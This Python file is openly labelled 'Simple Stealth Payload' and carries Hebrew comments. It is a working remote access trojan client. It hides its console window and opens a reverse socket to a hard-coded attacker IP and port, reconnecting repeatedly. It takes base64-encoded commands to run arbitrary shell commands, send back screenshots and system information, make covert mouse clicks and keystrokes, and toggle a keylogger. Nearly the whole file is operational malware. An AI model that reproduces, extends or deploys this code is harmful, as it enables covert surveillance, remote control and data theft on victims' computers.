# Simple Stealth Payload - Hidden Operations
import sys
import os
import socket
import time
import base64
import tabulate
import subprocess
import threading
import platform
import io
import psutil
from datetime import datetime

# Windows specific imports
try:
    import win32gui
    import win32con
    import win32api
    import win32console
    import pyscreenshot
    from PIL import Image
    import pyautogui
    pyautogui.FAILSAFE = False
    WINDOWS_AVAILABLE = True
except:
    WINDOWS_AVAILABLE = False

try:
    from pynput.keyboard import Listener
    HAVE_PYNPUT = True
except:
    HAVE_PYNPUT = False

# הגדרות חיבור - שנה את הכתובת שלך כאן!
CONSTIP = "123.456.789.012"  # הכתובת החיצונית שלך
CONSTPT = 2999

class STEALTH_OPERATIONS:
    """מחלקה לפעולות נסתרות"""
    
    def __init__(self):
        self.is_hidden = False
        self.hide_on_startup()
    
    def hide_on_startup(self):
        """הסתרה מיידית בהפעלה"""
        if WINDOWS_AVAILABLE:
            try:
                # הסתרת הקונסול
                console = win32console.GetConsoleWindow()
                if console:
                    win32gui.ShowWindow(console, win32con.SW_HIDE)
                self.is_hidden = True
            except:
                pass
    
    def stealth_click(self, x_ratio, y_ratio):
        """קליק נסתר - עם החזרת עכבר למקום"""
        try:
            if not WINDOWS_AVAILABLE:
                return "Windows libraries not available"
            
            # קבלת רזולוציית המסך
            screen_width = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
            screen_height = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
            
            # קבלת מיקום עכבר נוכחי
            current_pos = win32gui.GetCursorPos()
            
            # חישוב מיקום יעד
            target_x = int(screen_width * float(x_ratio))
            target_y = int(screen_height * float(y_ratio))
            
            # ביצוע קליק מהיר
            win32api.SetCursorPos((target_x, target_y))
            time.sleep(0.01)  # המתנה קצרה
            
            # קליק
            win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, target_x, target_y, 0, 0)
            time.sleep(0.01)
            win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, target_x, target_y, 0, 0)
            
            # החזרת עכבר למקום המקורי במהירות
            time.sleep(0.02)
            win32api.SetCursorPos(current_pos)
            
            return "Stealth click completed"
            
        except Exception as e:
            # גיבוי עם pyautogui
            try:
                screen_width, screen_height = pyautogui.size()
                x = int(screen_width * float(x_ratio))
                y = int(screen_height * float(y_ratio))
                pyautogui.click(x, y, duration=0.1)
                return "Backup click completed"
            except:
                return f"Click failed: {str(e)}"
    
    def stealth_keypress(self, key):
        """לחיצת מקש נסתרת"""
        try:
            if not WINDOWS_AVAILABLE:
                return "Windows libraries not available"
            
            # מיפוי מקשים בסיסי
            key_map = {
                'Return': 0x0D, 'Enter': 0x0D, 'Space': 0x20,
                'BackSpace': 0x08, 'Tab': 0x09, 'Escape': 0x1B,
                'Delete': 0x2E, 'Insert': 0x2D,
                'Up': 0x26, 'Down': 0x28, 'Left': 0x25, 'Right': 0x27,
                'Home': 0x24, 'End': 0x23, 'Page_Up': 0x21, 'Page_Down': 0x22
            }
            
            if key in key_map:
                vk_code = key_map[key]
            elif len(key) == 1:
                vk_code = ord(key.upper())
            else:
                return f"Unknown key: {key}"
            
            # ביצוע לחיצה
            win32api.keybd_event(vk_code, 0, 0, 0)
            time.sleep(0.01)
            win32api.keybd_event(vk_code, 0, win32con.KEYEVENTF_KEYUP, 0)
            
            return f"Key '{key}' pressed"
            
        except Exception as e:
            # גיבוי עם pyautogui
            try:
                pyautogui.press(key.lower())
                return f"Backup key '{key}' pressed"
            except:
                return f"Key press failed: {str(e)}"

class HIDDEN_SCREENSHOT:
    """צילום מסך שקט"""
    
    def capture(self):
        try:
            # ניסיון עם pyscreenshot (שקט יותר)
            img = pyscreenshot.grab()
            obj = io.BytesIO()
            img.save(obj, format="PNG")
            return obj.getvalue()
        except:
            try:
                # גיבוי עם pyautogui
                img = pyautogui.screenshot()
                obj = io.BytesIO()
                img.save(obj, format="PNG")
                return obj.getvalue()
            except:
                # תמונה שחורה אם הכל נכשל
                img = Image.new('RGB', (800, 600), color='black')
                obj = io.BytesIO()
                img.save(obj, format="PNG")
                return obj.getvalue()

class SYSINFO:
    """מידע מערכת"""
    
    def get_data(self):
        try:
            headers = ("Info", "Value")
            values = []
            
            uname = platform.uname()
            values.append(("System", uname.system))
            values.append(("Computer", uname.node))
            values.append(("Version", uname.version))
            
            # מידע על זיכרון
            memory = psutil.virtual_memory()
            values.append(("RAM Total", f"{memory.total // (1024**3)} GB"))
            values.append(("RAM Used", f"{memory.percent}%"))
            
            return tabulate.tabulate(values, headers=headers)
        except:
            return "System info not available"

class STEALTH_CLIENT:
    """קליינט נסתר"""
    
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.socket = None
        self.key = ")J@NcRfU"
        self.stealth = STEALTH_OPERATIONS()
        self.screenshot = HIDDEN_SCREENSHOT()
        self.sysinfo = SYSINFO()
        self.keylogger_active = False
        self.keylogger_data = ""
        
    def send_data(self, data, is_binary=False):
        """שליחת מידע"""
        try:
            if is_binary:
                encoded_data = base64.encodebytes(data)
            else:
                encoded_data = base64.encodebytes(data.encode('utf-8'))
            
            self.socket.send(encoded_data + self.key.encode('utf-8'))
        except:
            pass
    
    def handle_command(self, command):
        """טיפול בפקודות"""
        try:
            cmd_parts = command.decode('utf-8').split(":")
            
            if cmd_parts[0] == "screenshot":
                img_data = self.screenshot.capture()
                self.send_data(img_data, is_binary=True)
                
            elif cmd_parts[0] == "sysinfo":
                info = self.sysinfo.get_data()
                self.send_data(info)
                
            elif cmd_parts[0] == "shell":
                try:
                    result = subprocess.run(cmd_parts[1], shell=True, 
                                          capture_output=True, text=True, timeout=30)
                    output = result.stdout + result.stderr
                    self.send_data(output if output else "Command completed")
                except:
                    self.send_data("Command failed or timed out")
                    
            elif cmd_parts[0] == "mouse_click":
                coords = cmd_parts[1].split(',')
                if len(coords) == 2:
                    result = self.stealth.stealth_click(coords[0], coords[1])
                    self.send_data(result)
                    
            elif cmd_parts[0] == "key_press":
                result = self.stealth.stealth_keypress(cmd_parts[1])
                self.send_data(result)
                
            elif cmd_parts[0] == "stealth":
                if cmd_parts[1] == "toggle":
                    status = "ON" if self.stealth.is_hidden else "OFF"
                    self.send_data(f"Stealth mode: {status}")
                    
            elif cmd_parts[0] == "keylogger":
                if cmd_parts[1] == "on":
                    self.keylogger_active = True
                    self.send_data("Keylogger started")
                elif cmd_parts[1] == "off":
                    self.keylogger_active = False
                    self.send_data("Keylogger stopped")
                elif cmd_parts[1] == "dump":
                    self.send_data(self.keylogger_data)
                    
            else:
                self.send_data("Unknown command")
                
        except Exception as e:
            self.send_data(f"Error: {str(e)}")
    
    def listen_for_commands(self):
        """האזנה לפקודות"""
        data = ""
        while True:
            try:
                chunk = self.socket.recv(4096)
                if not chunk:
                    break
                    
                data += chunk.decode('utf-8')
                
                if self.key in data:
                    command_data = data.split(self.key)[0]
                    try:
                        command = base64.decodebytes(command_data.encode('utf-8'))
                        # טיפול בפקודה בthread נפרד
                        thread = threading.Thread(target=self.handle_command, args=(command,))
                        thread.daemon = True
                        thread.start()
                    except:
                        pass
                    data = ""
                    
            except:
                break
    
    def connect(self):
        """התחברות לשרת"""
        while True:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.ip, self.port))
                
                # התחברות הצליחה - התחל להאזין
                self.listen_for_commands()
                
            except:
                # כישלון - נסה שוב אחרי 5 שניות
                if self.socket:
                    try:
                        self.socket.close()
                    except:
                        pass
                time.sleep(5)

def main():
    """הפעלה ראשית"""
    # הסתרה מיידית
    if WINDOWS_AVAILABLE:
        try:
            console = win32console.GetConsoleWindow()
            if console:
                win32gui.ShowWindow(console, win32con.SW_HIDE)
        except:
            pass
    
    # התחברות והפעלה
    client = STEALTH_CLIENT(CONSTIP, CONSTPT)
    client.connect()

if __name__ == "__main__":
    main()
